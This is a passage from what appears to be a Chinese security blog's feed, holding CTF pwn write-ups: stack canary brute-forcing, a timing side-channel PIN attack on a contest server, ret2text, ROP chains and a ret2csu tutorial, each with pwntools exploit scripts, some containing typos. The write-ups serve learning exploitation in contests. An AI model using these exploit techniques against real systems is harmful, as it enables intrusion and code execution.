ret</span></span><br><span class="line">rop_len = <span class="number">59</span></span><br><span class="line">rop_chain = [add_rip_ret] * rop_len<span class="comment">#构建一个rop_len 完成execve</span></span><br><span class="line">p += <span class="string">b&#x27;&#x27;</span>.join(rop_chain)<span class="comment">#将列表转换为字符串进行填充</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;烧烤摊儿已归你所有，请赐名：&quot;</span>,p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="【funcannary】"><a href="#【funcannary】" class="headerlink" title="【funcannary】"></a><strong>【funcannary】</strong></h4><p>涨知识涨知识 没学够的菜狗😀<br>（1）先运行一下 pei’d配套checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       根据题目提示’have fun’和’welcome’在爆破的exp中会用作于覆盖节点</p><p>​                              ​<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>​         发现Canary和PIE都开 准备好爆破（如果有可以利用的字符串canary也可以绕过）<br>​         对应随机化 后续在IDA中只能利用其地址计算偏移</p><p>（2）进IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>fork接口 &#x3D;&#x3D; canary爆破（多线程）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p><p>发现函数入口为0x122D 并且发现”&#x2F;bin&#x2F;cat flag” 接下来找溢出位置爆破cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>明显溢出 定位该函数sub_128A（爆破canary的位置）爆破成功后爆返回地址 （爆canary地址的下一位）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>函数入口为0x122D shell返回地址为1329 偏移为0xfc 覆盖的buf大小为0x62</p><p><strong>tips</strong><br>【1】canary大小为0x00-0xff 所以爆破时每字节需循环257次 又因为canary低三位定为\x00（32位爆破循环3次 64位循环7次）此处需循环7次<br>【2】程序入口点一般都是整数，即地址最低位为00，也就是这里的地址，0x29是可信的。就只要爆破后一位就OK，再后面的地址都相同，爆不爆都一样。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fun&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>) </span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">#canary</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  info(<span class="string">f&#x27;No:<span class="subst">&#123;K+<span class="number">1</span>&#125;</span>start,finding...&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>)+cannary+btyes([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">      cannary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#return address</span></span><br><span class="line">re_1 = <span class="number">0x29</span></span><br><span class="line">re_2 = <span class="number">0</span></span><br><span class="line">info(<span class="string">&#x27;finding:re_2 ...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> re_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1) + p8(re_i)</span><br><span class="line"><span class="comment">#p8()将给定的整数转换为单字节的字节串</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  recv = p.recvuntil(<span class="string">b&quot;welcome\n&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">       re_2 = re_i</span><br><span class="line">       success(<span class="string">f&quot;re_2 =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(re_2)&#125;</span>&quot;</span>)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1 - <span class="number">1</span>) + p8(re_2 - <span class="number">1</span>)<span class="comment">#-1对齐栈</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地get<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530213510778.png" alt="image-20230530213510778">  </p><p><strong>login</strong><br>无附件 只打远程 涨知识捏 侧信道攻击 </p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">    p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">    p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">    p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>():</span><br><span class="line">    <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getpin</span>(<span class="params">pin</span>):</span><br><span class="line">subtime = -<span class="number">1</span></span><br><span class="line">res =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</span><br><span class="line">pin_o = pin+c+<span class="string">&#x27;0&#x27;</span>*(<span class="number">7</span>-<span class="built_in">len</span>(pin))</span><br><span class="line"><span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&quot;PIN code: &quot;</span>)</span><br><span class="line">start=time.time()</span><br><span class="line">sl(pin_o)</span><br><span class="line">rev=ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Wrong PIN code&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(pin_0)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">end=time.time()</span><br><span class="line"><span class="built_in">sum</span>+=(end-start)</span><br><span class="line"><span class="built_in">print</span>(cur,<span class="built_in">sum</span>)</span><br><span class="line">avgtime=<span class="built_in">sum</span></span><br><span class="line"><span class="keyword">if</span>(avgtime&gt;subtime):</span><br><span class="line">subtime=avgtime</span><br><span class="line">res=c</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">a=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">p= remote(<span class="string">&quot;123.56.238.150&quot;</span>,<span class="number">45118</span>)</span><br><span class="line">pin=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">pin+=getpin(pin)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;PIN:&quot;</span>,pin)</span><br><span class="line">ru(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;PASSWD&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&quot;123456&quot;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#flag&#123;d39a1013-e066-4d64-8558-4a5855fb7303&#125;   pin code : 54730891</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="【SSCTF】"><a href="#【SSCTF】" class="headerlink" title="【SSCTF】"></a>【SSCTF】</h3><p>pwn_stack<br>（1）checksec </p><p>​      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604234931863.png" alt="image-20230604234931863"></p><p>​       只开了NX好办捏😀<br>（2） 进IDA<br>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235352214.png" alt="image-20230604235352214"></p><p>很明显的函数提示 先看看主函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235530821.png" alt="image-20230604235530821"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235541815.png" alt="image-20230604235541815"></p><p>buf溢出但被打印出 可忽视（此处知识点较为模糊 还需进一步进行研究解读）v1处溢出<br>查看偏移位0x98 再回到shell函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230605000024030.png" alt="image-20230605000024030"></p><p>没什么好说直接开整 典型ret2text<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./1&quot;</span>)<span class="comment">#太懒了给文件名改名了😜</span></span><br><span class="line">bin_sh = <span class="number">0x0400831</span> </span><br><span class="line">sys_addr = <span class="number">0x40083D</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;What&#x27;s your name?&quot;)</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;A&#x27;</span>* (<span class="number">0x90</span> + <span class="number">8</span>) + p64(bin_sh)  + p64(sys_addr)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;yub&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;How old are you?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>从函数头返回注意栈对齐问题 +1跳过push rbp的8字节对齐</p><h3 id="【Black-Rop】"><a href="#【Black-Rop】" class="headerlink" title="【Black Rop】"></a>【Black Rop】</h3><p>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171541372.png" alt="image-20230629171541372"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171837565.png" alt="image-20230629171837565"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171906502.png" alt="image-20230629171906502"></p><p>常规溢出捏~<br>系统没给出system和”&#x2F;bin&#x2F;sh” 所以构造rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">pop4 = <span class="number">0x080493e8</span> <span class="comment"># pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop1 = <span class="number">0x0804901e</span> <span class="comment"># pop ebx ; ret</span></span><br><span class="line">pop2 = <span class="number">0x080493ea</span> <span class="comment"># pop edi ; pop ebp ; ret</span></span><br><span class="line">pop3 = <span class="number">0x080493e9</span> <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x12</span>+ flat(<span class="number">0</span>,<span class="number">0x80492ce</span>,<span class="number">0x8049293</span>, pop1, <span class="number">0x804a033</span>, <span class="number">0x80492e8</span>, pop1, <span class="number">0xbae</span>, <span class="number">0x804930b</span>, pop2, <span class="number">0x62023</span> , <span class="number">0xBF1212</span>, <span class="number">0x80491c2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;check your identity and read the flag.\n&quot;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu</title>
      <link href="/2023/09/01/ret2csu/"/>
      <url>/2023/09/01/ret2csu/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用x64下__libc_csu_init函数中的gadgets.（64位传参机制导致，但我们不会每次都精准找到每个寄存器对应的gadgets）</p><p>此函数对libc进行初始化，而一般的程序都会调用libc函数，则此函数一定存在.</p><p><strong>什么是gadgets？</strong><br>gadgets是一段对寄存器进行操作的汇编指令，比如pop ebp；pop eax；每一条指令对应着一段地址将这些gadgets部署到栈中，__ sp指针指向某gadget时发现对应地址中是一条指令而不是一条数据后就会将该地址弹给 __ ip指针， __ip指针会执行该地址中存放的汇编指令，完成对寄存器的操作.（某一gadget-0x1a得到上一gadget） </p><h3 id="实例（蒸米ROP）"><a href="#实例（蒸米ROP）" class="headerlink" title="实例（蒸米ROP）"></a>实例（蒸米ROP）</h3><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关闭栈保护并进行编译</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">g</span> -fno-<span class="keyword">stack</span>-protector —z execstack -o <span class="keyword">test</span>.c <span class="keyword">test</span></span><br></pre></td></tr></table></figure><p>关闭本机随机化（低配）</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo <span class="number">0</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space</span><br></pre></td></tr></table></figure><p>checksec看看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230728162434881.png" alt="image-20230728162434881"></p><p>可以看到PIE还打开（但我们关闭了本机上的地址随机化可以当作PIEdisable）<br>相当于用</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-<span class="keyword">stack</span>-protector -<span class="keyword">no</span>-pie -o level <span class="keyword">test</span>.c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729002006111.png" alt="image-20230729002006111"></p><p>Go to IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729152236817.png" alt="image-20230729152236817"></p><p>下面为gadget1，上面为gadget2.（不同版本gagget2不同，需要修改）</p><p>起始地址可以用0x4006AA，因为我们并不需要add，从pop需要寄存器开始就🆗.但是需要占位（解题思路中详细解释，请看以下分析）</p><p><strong>错位获取pop rsi；pop rdi</strong><br>若只是想单纯控制pop rsi和pop rdi寄存器，可以利用ROPgadget（pop r14和pop r15对应得gadget存在于libc_csu_init中）<br>机器码为<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729004219289.png" alt="image-20230729004219289"></p><p>具体search语法</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">level</span> <span class="built_in">--opcode</span> <span class="string">5e</span></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">level</span> | <span class="string">grep</span> <span class="string">&#x27;pop rsi&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>最终目的是执行system（‘&#x2F;bin&#x2F;sh’），NX保护开启，我们需要泄露libc函数地址(通过read&#x2F;write函数)，找到system函数写入‘&#x2F;bin&#x2F;sh’到bss段上，最后调用system函数.</p><p><strong>注意</strong><br>我们通常会把rbx的值设置成0，而rbp设置成1.这样的目的是在执行call qword ptr [r12+rbx*8]这个指令的时候，我们仅仅把r12的值给设置成指向我们想call地址的地址即可，从而不用管rbx。<br>又因为这三个指令add rbx,；cmp rbx, rbp；jnz short loc_400580，jnz是不相等时跳转，我们通常并不想跳转到0x400580这个地方，因为此刻执行这三个指令的时候，我们就是从0x400580这个地址过来的。因此rbx加一之后，我们要让它和rbp相等，因此rbp就要提前被设置成1.<br>r12要存放的就是指向（我们要跳转到那个地址）的地址。这里有个很重要的小技巧，如果你不想使用这个call，或者说你想call一个函数，但是你拿不到它的got地址，因此没法使用这个call，那就去call一个空函数（_term_proc函数）（并且要注意的是，r12的地址填写的并不是_term_proc的地址，而是指向这个函数的地址）。<br>r13,r14,r15这三个值分别对应了rdx,rsi,edi。这里要注意的是，r15最后传给的是edi,最后rdi的高四字节都是00，而低四字节才是r15里的内容。（也就是说如果想用ret2csu去把rdi里存放成一个地址是不可行的）</p><p><strong>填充图</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011314600.png" alt="image-20230729011314600"></p><p>注意gadget末尾有个ret p64（8）占位</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011813031.png" alt="image-20230729011813031"></p><p>为什么要将system函数地址写入bss段? 因为这行代码call qword ptr [r12+rbx*8]是<u>间接跳转</u>，也就是先将r12地址的值取出来，再进行跳转(想想Lazy Binding)。最后的效果就是，从bss_addr中取出system函数的地址，再跳转到system函数处。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729012308773.png" alt="image-20230729012308773"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSeacher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./level&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400564</span></span><br><span class="line">bss_addr = <span class="number">0x601028</span></span><br><span class="line">gadget1 = <span class="number">0x400606</span></span><br><span class="line">gadget2 = <span class="number">0x4005F0</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span>) + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(write_got)</span><br><span class="line">payload1 += p64(<span class="number">8</span>) + p64(gadget2) + cyclic(<span class="number">0x38</span>) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;/n&#x27;</span>, payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">sys_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span>) + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">0</span>) + p64(bss_addr)</span><br><span class="line">payload2 += p64(<span class="number">16</span>) + p64(gadget2) + cyclic(<span class="number">0x38</span>) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;/n&#x27;</span>, payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(sys_addr))</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh/x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = cyclic(<span class="number">0x88</span>) + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr + <span class="number">8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(gadget2) + <span class="string">&#x27;/x00&#x27;</span> * <span class="number">0x38</span> + p64(main_addr)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;/n&#x27;</span>, payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="其他题目"><a href="#其他题目" class="headerlink" title="其他题目"></a>其他题目</h3><h4 id="ciscn-2019-es-7（其实SROP）"><a href="#ciscn-2019-es-7（其实SROP）" class="headerlink" title="ciscn_2019_es_7（其实SROP）"></a>ciscn_2019_es_7（其实SROP）</h4><p>（1）checksec （名字太长就给改成a了w）</p><p>​    <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729160314382.png" alt="image-20230729160314382"></p><p>（2）Good woman IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164657543.png" alt="image-20230729164657543"></p><p>  偏移0x18<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164622920.png" 